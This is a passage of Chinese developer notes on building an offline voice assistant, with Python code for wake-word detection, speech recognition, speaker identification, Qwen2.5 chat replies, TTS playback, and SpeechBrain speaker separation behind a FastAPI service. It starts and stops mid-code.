asyncio.TimeoutError: raise HTTPException(status_code=504, detail=\u0026#34;处理超时\u0026#34;) except Exception as e: raise HTTPException(status_code=500, detail=str(e)) finally: for p in (tmp_path, out_path) if \u0026#39;tmp_path\u0026#39; in locals() else (): if os.path.exists(p): os.remove(p) @app.post(\u0026#34;/upload\u0026#34;) async def upload_file(file: UploadFile = File(...)): try: with tempfile.NamedTemporaryFile(suffix=\u0026#34;.wav\u0026#34;, delete=False) as tmp: async with aiofiles.open(tmp.name, \u0026#34;wb\u0026#34;) as f: await f.write(await file.read()) out = tmp.name + \u0026#34;_16k.wav\u0026#34; await asyncio.to_thread(lambda: os.system(f\u0026#34;ffmpeg -y -i {tmp.name} -ar 16000 -ac 1 -sample_fmt s16 {out} \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;)) return await asyncio.wait_for(_do_recognize(out), timeout=15) except asyncio.TimeoutError: raise HTTPException(status_code=504, detail=\u0026#34;处理超时\u0026#34;) except Exception as e: raise HTTPException(status_code=500, detail=str(e)) finally: for p in (tmp.name, out) if \u0026#39;tmp.name\u0026#39; in locals() else (): if os.path.exists(p): os.remove(p) ############################################################################### if __name__ == \u0026#34;__main__\u0026#34;: import uvicorn uvicorn.run(app, host=\u0026#34;0.0.0.0\u0026#34;, port=8000) 启动 source ~/qwen_stt/bin/activate python ~/qwen_stt/app.py 调用示例 # 远程 curl -X POST http://localhost:8000/recognize \\ -H \u0026#34;Content-Type: application/json\u0026#34; \\ -d \u0026#39;{\u0026#34;url\u0026#34;:\u0026#34;http://192.168.80.47:16552/test.wav\u0026#34;}\u0026#39; # 本地 curl -X POST http://localhost:8000/upload \\ -F \u0026#34;file=@/home/ubuntu/test.wav\u0026#34; 返回（命中卧室灯）：\n{ \u0026#34;text\u0026#34;: \u0026#34;帮我打开卧室灯\u0026#34;, \u0026#34;keyword\u0026#34;: \u0026#34;卧室灯\u0026#34;, \u0026#34;id\u0026#34;: 4, \u0026#34;chat\u0026#34;: \u0026#34;已为您打开卧室灯！\u0026#34; } 未命中：\n{ \u0026#34;text\u0026#34;: \u0026#34;今天天气怎么样\u0026#34;, \u0026#34;keyword\u0026#34;: null, \u0026#34;id\u0026#34;: 0, \u0026#34;chat\u0026#34;: \u0026#34;今天北京晴，25℃。\u0026#34; } multipart err pip install python-multipart Qwen2.5-1.5B 0.5b-\u0026gt;1.5b\ngit lfs install git clone https://huggingface.co/Qwen/Qwen2.5-1.5B-Instruct qwen2.5-1.5b 采样率 16kHz，保证vad ASR #!/usr/bin/env python3 import argparse import sys import os import json from pathlib import Path import numpy as np import sherpa_onnx import sounddevice as sd import threading import queue import time from collections import defaultdict import soundfile as sf from typing import Dict, List, Optional, Tuple from pypinyin import lazy_pinyin from fuzzywuzzy import fuzz import torch from transformers import AutoTokenizer, AutoModelForCausalLM import resampy # 用于重采样 # ------------------ 路径工具 ------------------ current_dir = os.path.dirname(os.path.abspath(__file__)) parent_dir = os.path.dirname(current_dir) def get_relative_path(relative_path: str) -\u0026gt; str: return os.path.join(parent_dir, relative_path) # ------------------ 关键词配置 ------------------ KEYWORD2ID = {\u0026#34;空调\u0026#34;: 1, \u0026#34;电视\u0026#34;: 2, \u0026#34;风扇\u0026#34;: 3, \u0026#34;卧室灯\u0026#34;: 4, \u0026#34;客厅灯\u0026#34;: 5} def fuzzy_match(text: str) -\u0026gt; Tuple[Optional[str], int]: txt_py = \u0026#34;\u0026#34;.join(lazy_pinyin(text)) for kw, kid in KEYWORD2ID.items(): if fuzz.partial_ratio(\u0026#34;\u0026#34;.join(lazy_pinyin(kw)), txt_py) \u0026gt;= 70: return kw, kid return None, 0 # ------------------ 大模型初始化 ------------------ QWEN_PATH = get_relative_path(\u0026#34;/root/room/models/qwen2.5-0.5b\u0026#34;) tok = AutoTokenizer.from_pretrained(QWEN_PATH, trust_remote_code=True) chat_model = AutoModelForCausalLM.from_pretrained( \u0026#34;Qwen/Qwen2.5-0.5B\u0026#34;, cache_dir=\u0026#34;/root/room/models\u0026#34;, torch_dtype=\u0026#34;auto\u0026#34;, device_map=\u0026#34;auto\u0026#34; ) def qwen_chat(prompt: str) -\u0026gt; str: msgs = [{\u0026#34;role\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;content\u0026#34;: prompt}] text = tok.apply_chat_template(msgs, tokenize=False, add_generation_prompt=True) inputs = tok(text, return_tensors=\u0026#34;pt\u0026#34;) with torch.no_grad(): out = chat_model.generate( **inputs, max_new_tokens=64, do_sample=True, temperature=0.7 ) return tok.decode(out[0][len(inputs.input_ids[0]):], skip_special_tokens=True).strip() # ------------------ 声纹相关 ------------------ def load_speaker_embedding_model(model_path: str): config = sherpa_onnx.SpeakerEmbeddingExtractorConfig( model=model_path, num_threads=1, debug=False, provider=\u0026#34;cpu\u0026#34;, ) if not config.validate(): raise ValueError(f\u0026#34;Invalid config. {config}\u0026#34;) return sherpa_onnx.SpeakerEmbeddingExtractor(config) def load_speaker_file(speaker_file_path: str) -\u0026gt; Dict[str, List[str]]: ans = defaultdict(list) with open(speaker_file_path) as f: for line in f: line = line.strip() if not line: continue fields = line.split() if len(fields) != 2: raise ValueError(f\u0026#34;Invalid line: {line}\u0026#34;) speaker_name, filename = fields ans[speaker_name].append(filename) return ans def compute_speaker_embedding(filenames: List[str], extractor) -\u0026gt; np.ndarray: ans = None for filename in filenames: samples, sr = sf.read(filename, always_2d=True, dtype=\u0026#34;float32\u0026#34;) samples = samples[:, 0] samples = np.ascontiguousarray(samples) stream = extractor.create_stream() stream.accept_waveform(sr, samples) stream.input_finished() embedding = np.array(extractor.compute(stream)) if ans is None: ans = embedding else: ans += embedding return ans / len(filenames) def init_speaker_identification(): speaker_model = get_relative_path(\u0026#34;/root/room/wespeaker_zh_cnceleb_resnet34.onnx\u0026#34;) speaker_file = get_relative_path(\u0026#34;/root/room/speaker.txt\u0026#34;) extractor = load_speaker_embedding_model(speaker_model) speaker_data = load_speaker_file(speaker_file) manager = sherpa_onnx.SpeakerEmbeddingManager(extractor.dim) for name, filelist in speaker_data.items(): emb = compute_speaker_embedding(filelist, extractor) status = manager.add(name, emb) if not status: raise RuntimeError(f\u0026#34;Failed to register speaker {name}\u0026#34;) return extractor, manager # ------------------ 唤醒词 ------------------ def wake_word_detection(input_device: int, input_sr: int) -\u0026gt; bool: kws_dir = get_relative_path(\u0026#34;/root/room/sherpa-onnx-kws-zipformer-wenetspeech-3.3M-2024-01-01\u0026#34;) keyword_spotter = sherpa_onnx.KeywordSpotter( tokens=os.path.join(kws_dir, \u0026#34;tokens.txt\u0026#34;), encoder=os.path.join(kws_dir, \u0026#34;encoder-epoch-12-avg-2-chunk-16-left-64.int8.onnx\u0026#34;), decoder=os.path.join(kws_dir, \u0026#34;decoder-epoch-12-avg-2-chunk-16-left-64.int8.onnx\u0026#34;), joiner=os.path.join(kws_dir, \u0026#34;joiner-epoch-99-avg-1-chunk-16-left-64.int8.onnx\u0026#34;), num_threads=1, max_active_paths=4, keywords_file=os.path.join(kws_dir, \u0026#34;keywords.txt\u0026#34;), keywords_score=1.0, keywords_threshold=0.25, num_trailing_blanks=1, provider=\u0026#34;cpu\u0026#34;, ) print(\u0026#34;等待唤醒词...\u0026#34;) stream = keyword_spotter.create_stream() chunk = int(0.1 * input_sr) with sd.InputStream(device=input_device, channels=1, dtype=\u0026#34;float32\u0026#34;, samplerate=input_sr) as s: while True: samples, _ = s.read(chunk) samples = samples.reshape(-1) stream.accept_waveform(input_sr, samples) while keyword_spotter.is_ready(stream): keyword_spotter.decode_stream(stream) result = keyword_spotter.get_result(stream) if result: print(f\u0026#34;检测到唤醒词: {result}\u0026#34;) keyword_spotter.reset_stream(stream) return True # ------------------ 语音识别 ------------------ def speech_recognition(extractor, speaker_manager, input_device: int, input_sr: int) -\u0026gt; Tuple[str, str]: target_sr = 16000 # VAD/ASR 采样率 recognizer = sherpa_onnx.OfflineRecognizer.from_paraformer( paraformer=get_relative_path(\u0026#34;/root/room/sherpa-onnx-paraformer-zh-2023-03-28/model.int8.onnx\u0026#34;), tokens=get_relative_path(\u0026#34;/root/room/sherpa-onnx-paraformer-zh-2023-03-28/tokens.txt\u0026#34;), num_threads=1, sample_rate=target_sr, feature_dim=80, decoding_method=\u0026#34;greedy_search\u0026#34;, debug=False, ) vad_config = sherpa_onnx.VadModelConfig() vad_config.silero_vad.model = get_relative_path(\u0026#34;/root/room/silero_vad.onnx\u0026#34;) vad_config.silero_vad.min_silence_duration = 0.5 vad_config.silero_vad.min_speech_duration = 0.5 vad_config.sample_rate = target_sr vad = sherpa_onnx.VoiceActivityDetector(vad_config, buffer_size_in_seconds=100) window_size = vad_config.silero_vad.window_size print(\u0026#34;请说出您的指令...\u0026#34;) chunk = int(0.1 * input_sr) audio_buffer = np.array([], dtype=\u0026#34;float32\u0026#34;) with sd.InputStream(device=input_device, channels=1, dtype=\u0026#34;float32\u0026#34;, samplerate=input_sr) as s: while True: samples, _ = s.read(chunk) samples = samples.reshape(-1) resampled = resampy.resample(samples, input_sr, target_sr) audio_buffer = np.concatenate([audio_buffer, resampled]) while len(audio_buffer) \u0026gt; window_size: vad.accept_waveform(audio_buffer[:window_size]) audio_buffer = audio_buffer[window_size:] while not vad.empty(): if len(vad.front.samples) \u0026lt; 0.5 * target_sr: vad.pop() continue stream = extractor.create_stream() stream.accept_waveform(target_sr, vad.front.samples) stream.input_finished() emb = np.array(extractor.compute(stream)) speaker = speaker_manager.search(emb, threshold=0.6) or \u0026#34;unknown\u0026#34; asr_stream = recognizer.create_stream() asr_stream.accept_waveform(target_sr, vad.front.samples) recognizer.decode_stream(asr_stream) text = asr_stream.result.text.strip() vad.pop() return text, speaker # ------------------ TTS ------------------ buffer = queue.Queue() started = False stopped = False killed = False event = threading.Event() tts_sr = 24000 output_sr = 48000 # 假设声卡输出 48kHz def generated_audio_callback(samples: np.ndarray, progress: float) -\u0026gt; int: global started # 这里重采样 TTS 输出到声卡的采样率 resampled = resampy.resample(samples, tts_sr, output_sr) buffer.put(resampled) if not started: started = True return 0 if killed else 1 def play_audio_callback(outdata: np.ndarray, frames: int, time, status): if killed or (started and buffer.empty() and stopped): event.set() if buffer.empty(): outdata.fill(0) return n = 0 while n \u0026lt; frames and not buffer.empty(): remaining = frames - n k = buffer.queue[0].shape[0] if remaining \u0026lt;= k: outdata[n:, 0] = buffer.queue[0][:remaining] buffer.queue[0] = buffer.queue[0][remaining:] n = frames if buffer.queue[0].shape[0] == 0: buffer.get() break outdata[n:n + k, 0] = buffer.get() n += k if n \u0026lt; frames: outdata[n:, 0] = 0 def tts_synthesis(text: str, output_device: int): global tts_sr, started, stopped tts_config = sherpa_onnx.OfflineTtsConfig( model=sherpa_onnx.OfflineTtsModelConfig( vits=sherpa_onnx.OfflineTtsVitsModelConfig( model=get_relative_path(\u0026#34;/root/room/vits-piper-zh_CN-huayan-medium/zh_CN-huayan-medium.onnx\u0026#34;), tokens=get_relative_path(\u0026#34;/root/room/vits-piper-zh_CN-huayan-medium/tokens.txt\u0026#34;), data_dir=get_relative_path(\u0026#34;/root/room/vits-piper-zh_CN-huayan-medium/espeak-ng-data\u0026#34;), ), provider=\u0026#34;cpu\u0026#34;, debug=False, num_threads=1, ), max_num_sentences=1, ) tts = sherpa_onnx.OfflineTts(tts_config) tts_sr = tts.sample_rate threading.Thread(target=lambda: sd.OutputStream( device=output_device, channels=1, callback=play_audio_callback, dtype=\u0026#34;float32\u0026#34;, samplerate=output_sr, blocksize=1024 ).start()).start() event.clear() started = False stopped = False tts.generate(text, sid=0, speed=1.0, callback=generated_audio_callback) stopped = True event.wait() # ------------------ 主流程 ------------------ def select_devices(): print(\u0026#34;=== 可用输入输出设备列表 ===\u0026#34;) print(sd.query_devices()) input_device = int(input(\u0026#34;请输入输入设备ID: \u0026#34;)) output_device = int(input(\u0026#34;请输入输出设备ID: \u0026#34;)) input_info = sd.query_devices(input_device) output_info = sd.query_devices(output_device) input_sr = int(input_info[\u0026#39;default_samplerate\u0026#39;]) print(f\u0026#34;选择输入采样率: {input_sr} Hz\u0026#34;) return input_device, output_device, input_sr def main(): global killed try: input_device, output_device, input_sr = select_devices() print(\u0026#34;初始化声纹识别...\u0026#34;) extractor, speaker_manager = init_speaker_identification() if wake_word_detection(input_device, input_sr): text, speaker = speech_recognition(extractor, speaker_manager, input_device, input_sr) print(f\u0026#34;识别结果: {text} (说话人: {speaker})\u0026#34;) keyword, kid = fuzzy_match(text) if keyword: reply = f\u0026#34;已为您操作【{keyword}】，编号{kid}\u0026#34; else: reply = qwen_chat(text) print(\u0026#34;回复:\u0026#34;, reply) tts_synthesis(reply, output_device) except KeyboardInterrupt: killed = True print(\u0026#34;\\n程序已终止\u0026#34;) sys.exit(0) if __name__ == \u0026#34;__main__\u0026#34;: main() qwen去除无关的符号 Qwen等大模型输出太自由，修改prompt\nmsgs = [ {\u0026#34;role\u0026#34;: \u0026#34;system\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;你是一个简洁的中文助手，只输出简短的答案，不要解释。\u0026#34;}, {\u0026#34;role\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;content\u0026#34;: prompt} ] text = tok.apply_chat_template(msgs, tokenize=False, add_generation_prompt=True) 完整代码\ndef qwen_chat(prompt: str) -\u0026gt; str: msgs = [ {\u0026#34;role\u0026#34;: \u0026#34;system\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;你是一个简洁的助手，只回答核心内容，用中文回答。\u0026#34;}, {\u0026#34;role\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;content\u0026#34;: prompt} ] text = tok.apply_chat_template(msgs, tokenize=False, add_generation_prompt=True) inputs = tok(text, return_tensors=\u0026#34;pt\u0026#34;) with torch.no_grad(): out = chat_model.generate( **inputs, max_new_tokens=64, do_sample=True, temperature=0.7, pad_token_id=tok.eos_token_id ) raw_output = tok.decode(out[0][len(inputs.input_ids[0]):], skip_special_tokens=True).strip() # 额外清理 for token in [\u0026#34;\u0026lt;/s\u0026gt;\u0026#34;, \u0026#34;\u0026lt;/user\u0026gt;\u0026#34;, \u0026#34;.user\u0026#34;, \u0026#34;🤨\u0026#34;, \u0026#34;## 128000\u0026#34;]: raw_output = raw_output.replace(token, \u0026#34;\u0026#34;) reply = raw_output.split(\u0026#34;\\n\u0026#34;)[0].strip() return reply 语速调整 tts.generate(text, sid=0, speed=1, callback=generated_audio_callback) 分离配置文件json prompt KEYWORD2ID 改成从 keywords.json 文件读取，把 system prompt 变成从外部 system_prompt.txt 文件读取，并且在程序里做错误处理和相应的加载。 下面是修改后的完整示例代码，我保持了结构清晰，你可以直接替换：\n#!/usr/bin/env python3 import argparse import sys import os import json from pathlib import Path import numpy as np import sherpa_onnx import sounddevice as sd import threading import queue import time from collections import defaultdict import soundfile as sf from typing import Dict, List, Optional, Tuple from pypinyin import lazy_pinyin from fuzzywuzzy import fuzz import torch from transformers import AutoTokenizer, AutoModelForCausalLM import resampy # 用于重采样 # ------------------ 路径工具 ------------------ current_dir = os.path.dirname(os.path.abspath(__file__)) parent_dir = os.path.dirname(current_dir) def get_relative_path(relative_path: str) -\u0026gt; str: return os.path.join(parent_dir, relative_path) # ------------------ 加载关键词配置 ------------------ def load_keywords() -\u0026gt; Dict[str, int]: keywords_file = get_relative_path(\u0026#34;keywords.json\u0026#34;) if not os.path.exists(keywords_file): raise FileNotFoundError(f\u0026#34;未找到关键词文件: {keywords_file}\u0026#34;) with open(keywords_file, \u0026#34;r\u0026#34;, encoding=\u0026#34;utf-8\u0026#34;) as f: return json.load(f) KEYWORD2ID = load_keywords() def fuzzy_match(text: str) -\u0026gt; Tuple[Optional[str], int]: txt_py = \u0026#34;\u0026#34;.join(lazy_pinyin(text)) for kw, kid in KEYWORD2ID.items(): if fuzz.partial_ratio(\u0026#34;\u0026#34;.join(lazy_pinyin(kw)), txt_py) \u0026gt;= 70: return kw, kid return None, 0 # ------------------ 加载 system prompt ------------------ def load_system_prompt() -\u0026gt; str: prompt_file = get_relative_path(\u0026#34;system_prompt.txt\u0026#34;) if not os.path.exists(prompt_file): raise FileNotFoundError(f\u0026#34;未找到 system prompt 文件: {prompt_file}\u0026#34;) with open(prompt_file, \u0026#34;r\u0026#34;, encoding=\u0026#34;utf-8\u0026#34;) as f: return f.read().strip() SYSTEM_PROMPT = load_system_prompt() # ------------------ 大模型初始化 ------------------ QWEN_PATH = get_relative_path(\u0026#34;/root/room/models/qwen2.5-0.5b\u0026#34;) tok = AutoTokenizer.from_pretrained(QWEN_PATH, trust_remote_code=True) chat_model = AutoModelForCausalLM.from_pretrained( \u0026#34;Qwen/Qwen2.5-0.5B\u0026#34;, cache_dir=\u0026#34;/root/room/models\u0026#34;, torch_dtype=\u0026#34;auto\u0026#34;, device_map=\u0026#34;auto\u0026#34; ) def qwen_chat(prompt: str) -\u0026gt; str: msgs = [ {\u0026#34;role\u0026#34;: \u0026#34;system\u0026#34;, \u0026#34;content\u0026#34;: SYSTEM_PROMPT}, {\u0026#34;role\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;content\u0026#34;: prompt} ] text = tok.apply_chat_template(msgs, tokenize=False, add_generation_prompt=True) inputs = tok(text, return_tensors=\u0026#34;pt\u0026#34;) with torch.no_grad(): out = chat_model.generate( **inputs, max_new_tokens=64, do_sample=True, temperature=0.7, pad_token_id=tok.eos_token_id ) raw_output = tok.decode(out[0][len(inputs.input_ids[0]):], skip_special_tokens=True).strip() for token in [\u0026#34;\u0026lt;/s\u0026gt;\u0026#34;, \u0026#34;\u0026lt;/user\u0026gt;\u0026#34;, \u0026#34;.user\u0026#34;, \u0026#34;🤨\u0026#34;, \u0026#34;## 128000\u0026#34;, \u0026#34;\\x0c\u0026#34;]: raw_output = raw_output.replace(token, \u0026#34;\u0026#34;) reply = raw_output.split(\u0026#34;\\n\u0026#34;)[0].strip() return reply # ------------------ 声纹相关 ------------------ def load_speaker_embedding_model(model_path: str): config = sherpa_onnx.SpeakerEmbeddingExtractorConfig( model=model_path, num_threads=1, debug=False, provider=\u0026#34;cpu\u0026#34;, ) if not config.validate(): raise ValueError(f\u0026#34;Invalid config. {config}\u0026#34;) return sherpa_onnx.SpeakerEmbeddingExtractor(config) def load_speaker_file(speaker_file_path: str) -\u0026gt; Dict[str, List[str]]: ans = defaultdict(list) with open(speaker_file_path) as f: for line in f: line = line.strip() if not line: continue fields = line.split() if len(fields) != 2: raise ValueError(f\u0026#34;Invalid line: {line}\u0026#34;) speaker_name, filename = fields ans[speaker_name].append(filename) return ans def compute_speaker_embedding(filenames: List[str], extractor) -\u0026gt; np.ndarray: ans = None for filename in filenames: samples, sr = sf.read(filename, always_2d=True, dtype=\u0026#34;float32\u0026#34;) samples = samples[:, 0] samples = np.ascontiguousarray(samples) stream = extractor.create_stream() stream.accept_waveform(sr, samples) stream.input_finished() embedding = np.array(extractor.compute(stream)) if ans is None: ans = embedding else: ans += embedding return ans / len(filenames) def init_speaker_identification(): speaker_model = get_relative_path(\u0026#34;/root/room/wespeaker_zh_cnceleb_resnet34.onnx\u0026#34;) speaker_file = get_relative_path(\u0026#34;/root/room/speaker.txt\u0026#34;) extractor = load_speaker_embedding_model(speaker_model) speaker_data = load_speaker_file(speaker_file) manager = sherpa_onnx.SpeakerEmbeddingManager(extractor.dim) for name, filelist in speaker_data.items(): emb = compute_speaker_embedding(filelist, extractor) status = manager.add(name, emb) if not status: raise RuntimeError(f\u0026#34;Failed to register speaker {name}\u0026#34;) return extractor, manager # ------------------ 唤醒词 ------------------ def wake_word_detection(input_device: int, input_sr: int) -\u0026gt; bool: kws_dir = get_relative_path(\u0026#34;/root/room/sherpa-onnx-kws-zipformer-wenetspeech-3.3M-2024-01-01\u0026#34;) keyword_spotter = sherpa_onnx.KeywordSpotter( tokens=os.path.join(kws_dir, \u0026#34;tokens.txt\u0026#34;), encoder=os.path.join(kws_dir, \u0026#34;encoder-epoch-12-avg-2-chunk-16-left-64.int8.onnx\u0026#34;), decoder=os.path.join(kws_dir, \u0026#34;decoder-epoch-12-avg-2-chunk-16-left-64.int8.onnx\u0026#34;), joiner=os.path.join(kws_dir, \u0026#34;joiner-epoch-99-avg-1-chunk-16-left-64.int8.onnx\u0026#34;), num_threads=1, max_active_paths=4, keywords_file=os.path.join(kws_dir, \u0026#34;keywords.txt\u0026#34;), keywords_score=1.0, keywords_threshold=0.25, num_trailing_blanks=1, provider=\u0026#34;cpu\u0026#34;, ) print(\u0026#34;等待唤醒词...\u0026#34;) stream = keyword_spotter.create_stream() chunk = int(0.1 * input_sr) with sd.InputStream(device=input_device, channels=1, dtype=\u0026#34;float32\u0026#34;, samplerate=input_sr) as s: while True: samples, _ = s.read(chunk) samples = samples.reshape(-1) stream.accept_waveform(input_sr, samples) while keyword_spotter.is_ready(stream): keyword_spotter.decode_stream(stream) result = keyword_spotter.get_result(stream) if result: print(f\u0026#34;检测到唤醒词: {result}\u0026#34;) keyword_spotter.reset_stream(stream) return True # ------------------ 语音识别 ------------------ def speech_recognition(extractor, speaker_manager, input_device: int, input_sr: int) -\u0026gt; Tuple[str, str]: target_sr = 16000 # VAD/ASR 采样率 recognizer = sherpa_onnx.OfflineRecognizer.from_paraformer( paraformer=get_relative_path(\u0026#34;/root/room/sherpa-onnx-paraformer-zh-2023-03-28/model.int8.onnx\u0026#34;), tokens=get_relative_path(\u0026#34;/root/room/sherpa-onnx-paraformer-zh-2023-03-28/tokens.txt\u0026#34;), num_threads=1, sample_rate=target_sr, feature_dim=80, decoding_method=\u0026#34;greedy_search\u0026#34;, debug=False, ) vad_config = sherpa_onnx.VadModelConfig() vad_config.silero_vad.model = get_relative_path(\u0026#34;/root/room/silero_vad.onnx\u0026#34;) vad_config.silero_vad.min_silence_duration = 0.5 vad_config.silero_vad.min_speech_duration = 0.5 vad_config.sample_rate = target_sr vad = sherpa_onnx.VoiceActivityDetector(vad_config, buffer_size_in_seconds=100) window_size = vad_config.silero_vad.window_size print(\u0026#34;请说出您的指令...\u0026#34;) chunk = int(0.1 * input_sr) audio_buffer = np.array([], dtype=\u0026#34;float32\u0026#34;) with sd.InputStream(device=input_device, channels=1, dtype=\u0026#34;float32\u0026#34;, samplerate=input_sr) as s: while True: samples, _ = s.read(chunk) samples = samples.reshape(-1) resampled = resampy.resample(samples, input_sr, target_sr) audio_buffer = np.concatenate([audio_buffer, resampled]) while len(audio_buffer) \u0026gt; window_size: vad.accept_waveform(audio_buffer[:window_size]) audio_buffer = audio_buffer[window_size:] while not vad.empty(): if len(vad.front.samples) \u0026lt; 0.5 * target_sr: vad.pop() continue stream = extractor.create_stream() stream.accept_waveform(target_sr, vad.front.samples) stream.input_finished() emb = np.array(extractor.compute(stream)) speaker = speaker_manager.search(emb, threshold=0.6) or \u0026#34;unknown\u0026#34; asr_stream = recognizer.create_stream() asr_stream.accept_waveform(target_sr, vad.front.samples) recognizer.decode_stream(asr_stream) text = asr_stream.result.text.strip() vad.pop() return text, speaker # ------------------ TTS ------------------ buffer = queue.Queue() started = False stopped = False killed = False event = threading.Event() tts_sr = 24000 output_sr = 48000 def generated_audio_callback(samples: np.ndarray, progress: float) -\u0026gt; int: global started resampled = resampy.resample(samples, tts_sr, output_sr) buffer.put(resampled) if not started: started = True return 0 if killed else 1 def play_audio_callback(outdata: np.ndarray, frames: int, time, status): if killed or (started and buffer.empty() and stopped): event.set() if buffer.empty(): outdata.fill(0) return n = 0 while n \u0026lt; frames and not buffer.empty(): remaining = frames - n k = buffer.queue[0].shape[0] if remaining \u0026lt;= k: outdata[n:, 0] = buffer.queue[0][:remaining] buffer.queue[0] = buffer.queue[0][remaining:] n = frames if buffer.queue[0].shape[0] == 0: buffer.get() break outdata[n:n + k, 0] = buffer.get() n += k if n \u0026lt; frames: outdata[n:, 0] = 0 def tts_synthesis(text: str, output_device: int): global tts_sr, started, stopped tts_config = sherpa_onnx.OfflineTtsConfig( model=sherpa_onnx.OfflineTtsModelConfig( vits=sherpa_onnx.OfflineTtsVitsModelConfig( model=get_relative_path(\u0026#34;/root/room/vits-piper-zh_CN-huayan-medium/zh_CN-huayan-medium.onnx\u0026#34;), tokens=get_relative_path(\u0026#34;/root/room/vits-piper-zh_CN-huayan-medium/tokens.txt\u0026#34;), data_dir=get_relative_path(\u0026#34;/root/room/vits-piper-zh_CN-huayan-medium/espeak-ng-data\u0026#34;), ), provider=\u0026#34;cpu\u0026#34;, debug=False, num_threads=1, ), max_num_sentences=1, ) tts = sherpa_onnx.OfflineTts(tts_config) tts_sr = tts.sample_rate threading.Thread(target=lambda: sd.OutputStream( device=output_device, channels=1, callback=play_audio_callback, dtype=\u0026#34;float32\u0026#34;, samplerate=output_sr, blocksize=1024 ).start()).start() event.clear() started = False stopped = False tts.generate(text, sid=0, speed=1, callback=generated_audio_callback) stopped = True event.wait() # ------------------ 主流程 ------------------ def select_devices(): print(\u0026#34;=== 可用输入输出设备列表 ===\u0026#34;) print(sd.query_devices()) input_device = int(input(\u0026#34;请输入输入设备ID: \u0026#34;)) output_device = int(input(\u0026#34;请输入输出设备ID: \u0026#34;)) input_info = sd.query_devices(input_device) output_info = sd.query_devices(output_device) input_sr = int(input_info[\u0026#39;default_samplerate\u0026#39;]) print(f\u0026#34;选择输入采样率: {input_sr} Hz\u0026#34;) return input_device, output_device, input_sr def main(): global killed try: input_device, output_device, input_sr = select_devices() print(\u0026#34;初始化声纹识别...\u0026#34;) extractor, speaker_manager = init_speaker_identification() if wake_word_detection(input_device, input_sr): text, speaker = speech_recognition(extractor, speaker_manager, input_device, input_sr) print(f\u0026#34;识别结果: {text} (说话人: {speaker})\u0026#34;) keyword, kid = fuzzy_match(text) if keyword: reply = f\u0026#34;已为您操作【{keyword}】，编号{kid}\u0026#34; else: reply = qwen_chat(text) print(\u0026#34;回复:\u0026#34;, reply) tts_synthesis(reply, output_device) except KeyboardInterrupt: killed = True print(\u0026#34;\\n程序已终止\u0026#34;) sys.exit(0) if __name__ == \u0026#34;__main__\u0026#34;: main() keywords.json\n{ \u0026#34;空调\u0026#34;: 1, \u0026#34;电视\u0026#34;: 2, \u0026#34;风扇\u0026#34;: 3, \u0026#34;卧室灯\u0026#34;: 4, \u0026#34;客厅灯\u0026#34;: 5 } system_prompt.txt\n你是一个简洁的助手，只回答核心内容，用中文回答。 外部编辑 keywords.json 和 system_prompt.txt 既可\n先加载声纹再选设备 extractor, speaker_manager = init_speaker_identification() input_device, output_device, input_sr = select_devices() 语音识别 分离 from speechbrain.inference.separation import SepformerSeparation as separator import torchaudio import torchaudio.transforms as T import os # 输入混合音频文件 input_path = \u0026#34;your_mix.wav\u0026#34; # 加载原始音频 waveform, sample_rate = torchaudio.load(input_path) # 加载模型 model = separator.from_hparams( source=\u0026#34;speechbrain/sepformer-wsj02mix\u0026#34;, # 这个模型要求 8k 采样率 savedir=\u0026#34;pretrained_models/sepformer-wsj02mix\u0026#34; ) # 从模型配置中获取目标采样率 target_sample_rate = model.hparams.sample_rate if hasattr(model.hparams, \u0026#34;sample_rate\u0026#34;) else sample_rate # 如果采样率不同，自动转换 if sample_rate != target_sample_rate: print(f\u0026#34;采样率不匹配：{sample_rate} → {target_sample_rate}，正在转换...\u0026#34;) resampler = T.Resample(orig_freq=sample_rate, new_freq=target_sample_rate) waveform = resampler(waveform) sample_rate = target_sample_rate # 临时保存转换后的音频（因为 SpeechBrain 的接口要求文件路径） tmp_path = \u0026#34;temp_resampled.wav\u0026#34; torchaudio.save(tmp_path, waveform, sample_rate) # 分离 est_sources = model.separate_file(path=tmp_path) # 自动检测人数 num_speakers = est_sources.shape[2] print(f\u0026#34;检测到 {num_speakers} 个声源\u0026#34;) # 保存每个分离结果（用原采样率保存） os.makedirs(\u0026#34;separated\u0026#34;, exist_ok=True) for i in range(num_speakers): out_path = f\u0026#34;separated/speaker_{i+1}.wav\u0026#34; torchaudio.save(out_path, est_sources[:, :, i].detach().cpu(), sample_rate) print(f\u0026#34;已保存: {out_path}\u0026#34;) # 删除临时文件 os.remove(tmp_path) 依赖\nsudo apt update sudo apt install ffmpeg pip install soundfile sudo apt install libsndfile1 python3 app.py stt 分离 英文 web pip install speechbrain torchaudio fastapi uvicorn python-multipart 项目结构 speechbrain_stt_project/ ├── app.py # FastAPI 后端主程序 ├── static/ │ └── index.html # 前端静态页面 ├── pretrained_models/ # 预训练模型目录（自动下载或手动放置） ├── uploads/ # 上传文件目录（运行时自动创建） ├── separated/ # 分离音频输出目录（运行时自动创建） ├── requirements.txt # Python依赖 └── Dockerfile # 容器构建文件 文件内容示例 app.py\nfrom fastapi import FastAPI, UploadFile, File from fastapi.responses import JSONResponse, HTMLResponse from fastapi.staticfiles import StaticFiles import torchaudio import torchaudio.transforms as T import os import shutil from speechbrain.inference import SepformerSeparation as separator from speechbrain.pretrained import EncoderDecoderASR app = FastAPI() # 挂载静态文件夹，访问 http://host:port/ app.mount(\u0026#34;/static\u0026#34;, StaticFiles(directory=\u0026#34;static\u0026#34;), name=\u0026#34;static\u0026#34;) # 加载模型 sep_model = separator.from_hparams( source=\u0026#34;speechbrain/sepformer-wsj02mix\u0026#34;, savedir=\u0026#34;pretrained_models/sepformer-wsj02mix\u0026#34; ) asr_model = EncoderDecoderASR.from_hparams( source=\u0026#34;speechbrain/asr-transformer-transformerlm-librispeech\u0026#34;, savedir=\u0026#34;pretrained_models/asr-transformer-transformerlm-librispeech\u0026#34; ) @app.get(\u0026#34;/\u0026#34;) async def homepage(): with open(\u0026#34;static/index.html\u0026#34;, \u0026#34;r\u0026#34;, encoding=\u0026#34;utf-8\u0026#34;) as f: html_content = f.read() return HTMLResponse(content=html_content) @app.post(\u0026#34;/upload/\u0026#34;) async def upload_audio(file: UploadFile = File(...)): 